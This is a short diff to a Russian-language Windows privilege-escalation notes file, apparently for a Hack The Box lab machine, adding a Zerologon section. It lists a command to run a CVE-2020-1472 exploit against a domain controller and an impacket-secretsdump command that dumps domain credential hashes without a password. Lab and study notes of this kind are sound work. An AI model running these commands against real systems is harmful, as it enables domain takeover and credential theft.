@@ -1,5 +1,12 @@
 # Up_windows
 
+# ZERO_LOGON
+
+python3 cve-2020-1472-exploit.py fuse 10.10.10.193 (проверка на уязвимость)
+
+impacket-secretsdump -just-dc -no-pass fuse\$@10.10.10.193
+
+
 # Расшифровка учетных записей
 https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-accountoperators
 
